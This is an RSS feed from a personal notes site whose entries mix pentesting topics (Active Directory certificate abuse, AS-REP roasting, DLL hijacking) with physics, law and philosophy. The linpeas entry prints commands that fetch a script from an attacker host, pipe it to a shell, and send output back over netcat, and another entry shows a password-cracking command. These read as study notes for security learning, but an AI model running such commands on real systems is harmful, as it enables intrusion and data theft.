<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Index on Braindump</title>
    <link>https://kdbed.github.io/</link>
    <description>Recent content in Index on Braindump</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 29 May 2022 21:44:03 +0800</lastBuildDate><atom:link href="https://kdbed.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>#&#43;title: Pentest - Active Directory - Certificate Services</title>
      <link>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</guid>
      <description>Active Directory Certificate Services social.technet.microsoft.com
Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton
Abusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify
PS C:\ &amp;gt; .</description>
    </item>
    
    <item>
      <title>1433 - Pentesting MSSQL - Microsoft SQL Server</title>
      <link>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</guid>
      <description>hacktricks</description>
    </item>
    
    <item>
      <title>Abortion</title>
      <link>https://kdbed.github.io/posts/abortion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/abortion/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Abortion and the Supreme Court: Roe V Wade, Dobbs V Jackson, etc</title>
      <link>https://kdbed.github.io/posts/roevwade/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/roevwade/</guid>
      <description>Abortion and the Supreme Court Roe V Wade Basic Conclusions - Roe Drawing on the First, Fourth, Ninth, and Fourteenth Amendments, the Court said that the Constitution protects an individual’s “zones of privacy.” Citing earlier cases that ruled that contraception, marriage, and child rearing were activities included in these “zones of privacy,” the Court found that the zone was “broad enough to encompass a woman’s decision whether or not to terminate her pregnancy.</description>
    </item>
    
    <item>
      <title>Account Lockout - Splunk</title>
      <link>https://kdbed.github.io/posts/account_lockout_splunk/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/account_lockout_splunk/</guid>
      <description>Monitoring Active Directory account lockouts with Splunk
index=wineventlog Account_Name=&amp;lt;&amp;lt;accountNameHere&amp;gt;&amp;gt;&amp;gt; (EventCode=4740 OR EventCode=4625 OR EventCode=644 OR EventCode=529 OR EventCode=675 OR EventCode=676 OR EventCode=681 OR EventCode=4771 OR EventCode=4770 OR EventCode=4768 OR EventCode=4776 OR EventCode=4777 OR EventCode=4725 OR EventCode=4723 OR EventCode=4724 OR EventCode=4767 OR EventCode=4800 OR EventCode=4801) | eval Account0=mvindex(Account_Name,0) | eval Account1=mvindex(Account_Name,1) | eval Account=case(EventCode==4624,Account1, EventCode==4625,Account1, EventCode==4648,Account1, EventCode==4722,Account1, EventCode==4723,Account1, EventCode==4724,Account1, EventCode==4725,Account1, EventCode==4738,Account1, EventCode==4740,Account1, EventCode==4767,Account1, EventCode==4768,Account0, EventCode==4769,Account0, EventCode==4771,Account0, EventCode==4770,Account0, EventCode==5140,Account0, EventCode==4778,Account0, EventCode==4779,Account0, EventCode==4800,Account0, EventCode==4801,Account0) | fillnull Value=&amp;#34;-&amp;#34; Account | eval ActionBy=case(EventCode==4725,Account0, EventCode==4722,src_user, EventCode==4767,src_user, EventCode==4723,src_user, EventCode==4724,src_user, EventCode==4738,src_user, EventCode==4794,src_user) | eval Time=strftime(_time, &amp;#34;%m/%d/%y %H:%M:%S&amp;#34;) | sort -_time | eval Caller_Machine=if(Caller_Machine_Name!</description>
    </item>
    
    <item>
      <title>Active Directory</title>
      <link>https://kdbed.github.io/posts/active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/active_directory/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Active Scanning with Scapy</title>
      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.
SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
    </item>
    
    <item>
      <title>Algorithms</title>
      <link>https://kdbed.github.io/posts/algorithms/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/algorithms/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Ansible - Playbook weaponization</title>
      <link>https://kdbed.github.io/posts/ansible_playbook_weaponization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ansible_playbook_weaponization/</guid>
      <description>https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/</description>
    </item>
    
    <item>
      <title>AS-REP Roasting</title>
      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
    </item>
    
    <item>
      <title>Binary Analysis</title>
      <link>https://kdbed.github.io/posts/binary_analysis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/binary_analysis/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Birthday Attack</title>
      <link>https://kdbed.github.io/posts/birthdayattack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/birthdayattack/</guid>
      <description>Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.</description>
    </item>
    
    <item>
      <title>C&#43;&#43; - STL</title>
      <link>https://kdbed.github.io/posts/c_stl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/c_stl/</guid>
      <description></description>
    </item>
    
    <item>
      <title>C&#43;&#43; and Nix</title>
      <link>https://kdbed.github.io/posts/cpp_proj_nix/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/cpp_proj_nix/</guid>
      <description>Template Project in C++ using Nix Taken from this blog post.
Creating a C++ project Create a sample C++ project with the following dependencies
C++ compiler, of course. That might be GCC or Clang. Boost Poco The program does nothing more than printing what compiler it was built with and which versions of boost and poco it is linked against.
Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include &amp;lt;boost/lexical_cast.</description>
    </item>
    
    <item>
      <title>Category Theory</title>
      <link>https://kdbed.github.io/posts/category_theory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/category_theory/</guid>
      <description></description>
    </item>
    
    <item>
      <title>ComptTIA Security&#43;</title>
      <link>https://kdbed.github.io/posts/securityplus/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/securityplus/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Computer Science</title>
      <link>https://kdbed.github.io/posts/computer_science/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/computer_science/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Conditions of Causation</title>
      <link>https://kdbed.github.io/posts/conditions_of_causation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/conditions_of_causation/</guid>
      <description>Conditions of Causality There are four conditions of causality: logical time ordering, correlation, mechanism, and nonspuriousness. Logical time ordering refers to the idea that one variable needs to precede another variable in time for the first variable to influence the second variable. For example, throughout the world, people are protesting their governments. In some countries, governments respond with the metaphorical yawn. However, in other countries, the governments may respond with repressive tactics.</description>
    </item>
    
    <item>
      <title>Cracking - PDF</title>
      <link>https://kdbed.github.io/posts/cracking_pdf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/cracking_pdf/</guid>
      <description>fcrackzip fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt </description>
    </item>
    
    <item>
      <title>DLL Hijacking</title>
      <link>https://kdbed.github.io/posts/dll_hijacking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/dll_hijacking/</guid>
      <description>Basic Ideas Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL. Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely. hackTricks
Approaches There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.</description>
    </item>
    
    <item>
      <title>DNS Zone Transfers</title>
      <link>https://kdbed.github.io/posts/dnszonetransfers/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/dnszonetransfers/</guid>
      <description>DNS Zone Transfers DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.
How DNS Works DNS (Domain Name System) is like an Internet phonebook.</description>
    </item>
    
    <item>
      <title>Dopamine</title>
      <link>https://kdbed.github.io/posts/dopamine/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/dopamine/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Eikonal Approximation</title>
      <link>https://kdbed.github.io/posts/eikonal_approximation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/eikonal_approximation/</guid>
      <description>Eikonal Approximation in Quantum Mechanics Introduction and Background The root eikon comes from eikenai, a transliteration of the Greek εικεναι meaning &amp;rsquo;to resemble&amp;rsquo;. In Greek the word εικον means image &amp;ndash; compare &amp;lsquo;icon&amp;rsquo; in English. The image provided by the eikonal approximation in scattering has its origin in optics, wherein one assumes (ray optics) that the size of an obstacle is large compared to the wavelength of scattered light. When diffraction is involved, one moves from the eikonal approximation (back) to Maxwell&amp;rsquo;s Equations.</description>
    </item>
    
    <item>
      <title>Electrodynamics</title>
      <link>https://kdbed.github.io/posts/electrodynamics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/electrodynamics/</guid>
      <description>Physics</description>
    </item>
    
    <item>
      <title>Fileless Malware</title>
      <link>https://kdbed.github.io/posts/fileless_malware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/fileless_malware/</guid>
      <description>What is Fileless Malware? Traditionally, antivirus and other endpoint security products have focused on files (executables) to detect and prevent malware. There are several advantages to this. Files can be hashed, queried in reputation services, examined by both static analysis and machine learning, and easily excluded for false detections.
This is a problem for hackers: if the malware’s signature is detected two days after release, the attacker’s ROI (return on investment) may be significantly less than expected, or even negligible.</description>
    </item>
    
    <item>
      <title>FTP - retrieve files with Python</title>
      <link>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ftp_retrieve_files_with_python/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Generative Effects: Orders and Galois Connections</title>
      <link>https://kdbed.github.io/posts/generativeeffects/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/generativeeffects/</guid>
      <description>Introduction From An Invitation to Applied Category Theory - Seven Sketches in Compositionality &amp;ndash; Fong/Spivak
A wide variety of situations exhibit something called compositionality &amp;ndash; wherein systems or relationships can be combined to form new systems or relationships. Category-theoretic constructs can be used to describe the compositionality in such situations. A structural approach to modeling with Category Theory : introduction.
More Than the Sum of Their Parts </description>
    </item>
    
    <item>
      <title>Greenhouse Gas Emissions</title>
      <link>https://kdbed.github.io/posts/greenhouseemissions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/greenhouseemissions/</guid>
      <description>Raw Numbers Fifty-one billion is how many tons of greenhouse gases the world typically adds to the atmosphere every year. &amp;ndash;Bill Gates, How to Avoid a Climate Disaster (2021)</description>
    </item>
    
    <item>
      <title>Happiness</title>
      <link>https://kdbed.github.io/posts/happiness/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/happiness/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Haskell - Org Test</title>
      <link>https://kdbed.github.io/posts/haskelltest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/haskelltest/</guid>
      <description>Map import Control.Monad :{ map (\x -&amp;gt; x*x + x + 1) [1..10] :} [3,7,13,21,31,43,57,73,91,111] </description>
    </item>
    
    <item>
      <title>HTTP/2</title>
      <link>https://kdbed.github.io/posts/http_2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/http_2/</guid>
      <description>https://portswigger.net/research/http2
Request smuggling https://lab.wallarm.com/http2smugl-http2-request-smuggling-security-testing-tool/</description>
    </item>
    
    <item>
      <title>IdentityIQEssentialsIntroduction</title>
      <link>https://kdbed.github.io/posts/identityiqessentialsintroduction/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/identityiqessentialsintroduction/</guid>
      <description>Introduction Reading data: all systems from which data is read are called applications. Identity cubes created when aggregating accounts from an authoritative application (system of record), e.g., HR system or AD. Business modeling Governance Process Provisioning Process : User Request; Lifecycle event </description>
    </item>
    
    <item>
      <title>Impacket</title>
      <link>https://kdbed.github.io/posts/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/impacket/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Information Security</title>
      <link>https://kdbed.github.io/posts/information_security/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/information_security/</guid>
      <description>Computer Science</description>
    </item>
    
    <item>
      <title>Internet Security Association and Key Management Protocol (ISAKMP)</title>
      <link>https://kdbed.github.io/posts/isakmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/isakmp/</guid>
      <description>Internet Security Association and Key Management Protocol (ISAKMP) Wiki Overview ISAKMP defines the procedures for authenticating a communicating peer, creation and management of Security Associations, key generation techniques and threat mitigation (e.g. denial of service and replay attacks). As a framework,[1] ISAKMP typically utilizes IKE for key exchange, although other methods have been implemented such as Kerberized Internet Negotiation of Keys. A Preliminary SA is formed using this protocol; later a fresh keying is done.</description>
    </item>
    
    <item>
      <title>Intro to Pwntools - TryHackMe</title>
      <link>https://kdbed.github.io/posts/introtopwntools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/introtopwntools/</guid>
      <description>Basics of Binary Analysis
Intro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef
Checksec Same source code, compiled with different protections in place:
1 checksec checksec/intro2pwn2 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 1 checksec checksec/intro2pwn1 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1&amp;#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it.</description>
    </item>
    
    <item>
      <title>IP Time to Live (TTL)</title>
      <link>https://kdbed.github.io/posts/ip_time_to_live_ttl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/ip_time_to_live_ttl/</guid>
      <description>packetpushers</description>
    </item>
    
    <item>
      <title>Kali Linux - Basics</title>
      <link>https://kdbed.github.io/posts/kali_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/kali_basics/</guid>
      <description>:ID: cb51a9d3-842b-4b10-ae56-2d18573b5f3e
:END:
Filesystem FHS - Filesystem Hierarchy Standard - conventions used for layout of a UNIX system LinuxFoundation
/bin : basic programs like ls, cd, cat /sbin : system programs like fdisk, makefs, sysctl /etc : configuration files bk /tmp : temporary files, typically deleted on boot /usr/bin : applications like apt, ncat, nmap /usr/share : application support and data files Basic Linux commands Finding files which searches through directories in the $PATH environment variable for a given file name; returns the full path to the file if a match is found</description>
    </item>
    
    <item>
      <title>Kerberoasting</title>
      <link>https://kdbed.github.io/posts/kerberoasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/kerberoasting/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Kerberos</title>
      <link>https://kdbed.github.io/posts/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/kerberos/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Lang - Test</title>
      <link>https://kdbed.github.io/posts/lang_test/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/lang_test/</guid>
      <description>extern crate primal; use primal::Sieve; fn num_divisors(n: usize, primes: &amp;amp;Sieve) -&amp;gt; Option&amp;lt;usize&amp;gt; { match primes.factor(n) { Ok(factors) =&amp;gt; Some(factors.into_iter().fold(1, |acc, (_, x)| acc * (x + 1))), Err(_) =&amp;gt; None, } } fn main() { println!(&amp;#34;24 days of Rust - primal (day 2)&amp;#34;); let sieve = Sieve::new(10000); let suspect = 5273; println!(&amp;#34;{} is prime: {}&amp;#34;, suspect, sieve.is_prime(suspect)); let not_a_prime = 1024; println!(&amp;#34;{} is prime: {}&amp;#34;, not_a_prime, sieve.is_prime(not_a_prime)); let n = 1000; match sieve.</description>
    </item>
    
    <item>
      <title>Lang - Test</title>
      <link>https://kdbed.github.io/posts/rust_test/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/rust_test/</guid>
      <description> extern crate regex; use regex::Regex; fn main() { let re = Regex::new(r&amp;#34;^\d{4}-\d{2}-\d{2}$&amp;#34;).unwrap(); println!(&amp;#34;test&amp;#34;); assert!(re.is_match(&amp;#34;2014-01-01&amp;#34;)); } 1 2 3 4 5 #include &amp;lt;iostream&amp;gt; int main(){ std::cout&amp;lt;&amp;lt;&amp;#34;Hello, World.\n&amp;#34;; return 0; } Hello, World. </description>
    </item>
    
    <item>
      <title>lastLogon vs lastLogonTimestamp</title>
      <link>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/lastlogon_vs_lastlogontimestamp/</guid>
      <description>lastLogon vs lastLogonTimestamp If you ask for types of situations, then any logon event updates the lastlogontimestamp, but only some of them update lastlogon attribute.
There are certain types of events that only emulate the logon without using the actual username and password that update only the lastlogon attribute.
Kerberos S4u2Self How LastLogonTimeStamp is Updated with Kerberos S4u2Self S4U2self</description>
    </item>
    
    <item>
      <title>Lateral Movement</title>
      <link>https://kdbed.github.io/posts/lateral_movement/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/lateral_movement/</guid>
      <description>Lateral Movement The adversary is trying to move through your environment.
Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.</description>
    </item>
    
    <item>
      <title>linpeas</title>
      <link>https://kdbed.github.io/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/linpeas/</guid>
      <description>See carlospolop : PEASS-ng hacktricks
Execution: Run from memory and send back to attacker:
# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
    </item>
    
    <item>
      <title>Malware</title>
      <link>https://kdbed.github.io/posts/malware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/malware/</guid>
      <description>Information Security</description>
    </item>
    
    <item>
      <title>Marx</title>
      <link>https://kdbed.github.io/posts/marx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/marx/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Maxwell&#39;s Equations</title>
      <link>https://kdbed.github.io/posts/maxwell_s_equations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/maxwell_s_equations/</guid>
      <description>Electrodynamics</description>
    </item>
    
    <item>
      <title>NetBIOS</title>
      <link>https://kdbed.github.io/posts/netbios/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/netbios/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Nietzsche</title>
      <link>https://kdbed.github.io/posts/nietzsche/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/nietzsche/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Nietzsche and Stoicism</title>
      <link>https://kdbed.github.io/posts/nietzsche_and_stoicism/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/nietzsche_and_stoicism/</guid>
      <description>Nietzsche and Stoicism Resolution of contradictions After describing the Stoics’ essential psychological characteristics, Nietzsche advances two obscure but critical remarks. First, he questions whether the Stoics’ attainment of their ethical ideal is significant on the grounds that the decision to adopt Stoic therapy is determined in advance by one’s character. Second, he rebukes the Stoics for underestimating the worth of pain and passion, and for the fatalistic acceptance of life that their therapy produces.</description>
    </item>
    
    <item>
      <title>NX</title>
      <link>https://kdbed.github.io/posts/nx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/nx/</guid>
      <description>Binary Analysis</description>
    </item>
    
    <item>
      <title>Optics</title>
      <link>https://kdbed.github.io/posts/optics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/optics/</guid>
      <description>Physics</description>
    </item>
    
    <item>
      <title>Org Mode - Python/Jupyter Example</title>
      <link>https://kdbed.github.io/posts/orgpythonjupyter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/orgpythonjupyter/</guid>
      <description>Create a Session Initialize server with org-babel-exp-src-block. Afterwards, &amp;lsquo;Enter&amp;rsquo; in the sourceblock will execute.
print(&amp;#39;ello, world!&amp;#39;) Create a plot import matplotlib.pyplot as plt fig, ax = plt.subplots() ax.plot([1, 2, 3, 4], [1, 4, 2, 3]) pass Ocaml print_string &amp;#34;Hello world!\n&amp;#34; </description>
    </item>
    
    <item>
      <title>Originalism</title>
      <link>https://kdbed.github.io/posts/originalism/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/originalism/</guid>
      <description>Originalism, the theory that the Constitution should be interpreted according to the meaning or intent of the drafters, has great appeal to Americans. At one time closely associated with the conservative movement, originalism is now commonly held as an important, if not the exclusive, device for interpreting the Constitution. This has not been our historic practice. Over thirty years ago, Munzer and Nickel (1977, 1029) wrote that “one does not have to dig very deeply into the literature of American constitutional law to suspect that many constitutional provisions do not mean today what their framers thought they meant.</description>
    </item>
    
    <item>
      <title>OS Identification - Ping</title>
      <link>https://kdbed.github.io/posts/os_identification_ping/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/os_identification_ping/</guid>
      <description>IP Time to Live (TTL) on the ICMP packets The default TTL on windows is 128, which gets decremented by one at the router between the host and the box to 127. On the other hand the default for Linux is typically 64, so expect to see 63 for a Linux host.</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - DCSync</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</guid>
      <description>hacktricks - DCSync</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - SID-History Injection</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</guid>
      <description>SentinelOne
ADSecurity
MITRE</description>
    </item>
    
    <item>
      <title>Pentest - Active Directory - Skeleton Key</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
      <description>hacktricks
netwrix</description>
    </item>
    
    <item>
      <title>Pentest - Generating Wordlists</title>
      <link>https://kdbed.github.io/posts/pentest_generatingwordlists/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_generatingwordlists/</guid>
      <description>Generating Wordlists Username anarchy http://morningstarsecurity.com/research/username-anarchy https://github.com/urbanadventurer/username-anarchy/</description>
    </item>
    
    <item>
      <title>Pentest - gRPC Port 50051</title>
      <link>https://kdbed.github.io/posts/pentest_grpc_port_50051/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_grpc_port_50051/</guid>
      <description>gRPC gRPC (short for Google Remote Procedure Call) is a modern open-source framework developed by Google for creating high-performance, language-agnostic remote procedure call (RPC) systems. It enables communication and interaction between different applications or services running on different platforms and written in different programming languages.
On Linux, gRPC provides a mechanism for building distributed systems by allowing services to communicate with each other efficiently and securely over a network. It utilizes HTTP/2 protocol as its transport layer and supports different serialization formats like Protocol Buffers (protobuf) for efficient data exchange.</description>
    </item>
    
    <item>
      <title>Pentest - Passive Information Gathering</title>
      <link>https://kdbed.github.io/posts/pentest_passive_information_gathering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_passive_information_gathering/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Pentest - Python</title>
      <link>https://kdbed.github.io/posts/pentest_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kdbed.github.io/posts/pentest_python/</guid>
